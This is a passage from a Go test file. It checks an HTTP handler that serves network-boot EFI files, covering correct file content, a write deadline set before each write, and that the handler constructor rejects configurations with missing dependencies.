	req, err := http.NewRequestWithContext(t.Context(), http.MethodGet, srv.URL+"/tftp/arm64/snp.efi", http.NoBody)
	if err != nil {
		t.Fatalf("NewRequest: %v", err)
	}
	resp, err := srv.Client().Do(req)
	if err != nil {
		t.Fatalf("GET: %v", err)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatalf("read body: %v", err)
	}

	if resp.StatusCode != http.StatusOK || string(body) != "arm64-efi" {
		t.Errorf("response = %d %q, want 200 arm64-efi", resp.StatusCode, body)
	}
}

// deadlineRecorder records the order of SetWriteDeadline calls and writes.
type deadlineRecorder struct {
	*httptest.ResponseRecorder

	events    []string
	deadlines []time.Time
}

func (r *deadlineRecorder) SetWriteDeadline(t time.Time) error {
	r.events = append(r.events, "deadline")
	r.deadlines = append(r.deadlines, t)
	return nil
}

func (r *deadlineRecorder) Write(b []byte) (int, error) {
	r.events = append(r.events, "write")
	return r.ResponseRecorder.Write(b)
}

func TestTFTPRoute_DeadlineBeforeEveryWrite(t *testing.T) {
	big := bytes.Repeat([]byte{0xEF}, 200_000)
	cfg, _ := testConfig(t, fleet.NewRepository(dbtest.SQLite(t)), t.TempDir())
	cfg.Files = map[string][]byte{"amd64/snp.efi": big}
	h, err := NewHandlers(cfg)
	if err != nil {
		t.Fatalf("NewHandlers: %v", err)
	}
	rec := &deadlineRecorder{ResponseRecorder: httptest.NewRecorder()}

	before := time.Now()
	h.PlainHTTP().ServeHTTP(rec, newRequest(t, "/tftp/amd64/snp.efi", false))
	after := time.Now()

	if !bytes.Equal(rec.Body.Bytes(), big) {
		t.Fatalf("served %d bytes, want %d", rec.Body.Len(), len(big))
	}
	if len(rec.events) < 4 {
		t.Fatalf("events = %v, want several writes", rec.events)
	}
	for i, e := range rec.events {
		if want := []string{"deadline", "write"}[i%2]; e != want {
			t.Fatalf("event %d = %q, want %q (events %v)", i, e, want, rec.events)
		}
	}
	for _, d := range rec.deadlines {
		if d.Before(before.Add(30*time.Second)) || d.After(after.Add(30*time.Second)) {
			t.Errorf("deadline %v is not 30s after the write (between %v and %v)", d, before, after)
		}
	}
}

func TestIdleWriter_UnwrapReachesTheConnection(t *testing.T) {
	rec := &deadlineRecorder{ResponseRecorder: httptest.NewRecorder()}

	err := http.NewResponseController(idleWriter{rec}).SetWriteDeadline(time.Now())

	if err != nil || len(rec.deadlines) != 1 {
		t.Errorf("SetWriteDeadline through idleWriter = %v with %d deadlines, want nil and 1", err, len(rec.deadlines))
	}
}

func TestStart_WriteDeadline(t *testing.T) {
	g := newRig(t)
	rec := &deadlineRecorder{ResponseRecorder: httptest.NewRecorder()}

	before := time.Now()
	g.h.PlainHTTP().ServeHTTP(rec, newRequest(t, "/start", false))
	after := time.Now()

	if len(rec.deadlines) != 1 || rec.events[0] != "deadline" {
		t.Fatalf("events = %v, want one deadline before the write", rec.events)
	}
	if d := rec.deadlines[0]; d.Before(before.Add(10*time.Second)) || d.After(after.Add(10*time.Second)) {
		t.Errorf("deadline %v is not 10s from now (between %v and %v)", d, before, after)
	}
}

func TestNewHandlers_RejectsMissingDependencies(t *testing.T) {
	cases := []struct {
		name string
		mod  func(*Config)
		opts []Option
		want string
	}{
		{"nil Repo", func(c *Config) { c.Repo = nil }, nil, "Repo"},
		{"nil Store", func(c *Config) { c.Store = nil }, nil, "Store"},
		{"nil Catalog", func(c *Config) { c.Catalog = nil }, nil, "Catalog"},
		{"nil error handler", func(*Config) {}, []Option{WithErrorHandler(nil)}, "error handler"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			g := newRig(t)
			cfg, _ := testConfig(t, g.repo, t.TempDir())
			tc.mod(&cfg)

			h, err := NewHandlers(cfg, tc.opts...)

			if err == nil || !strings.Contains(err.Error(), tc.want) {
				t.Errorf("NewHandlers = (handlers %t), %v; want an error naming %q", h != nil, err, tc.want)
			}
		})
	}
}
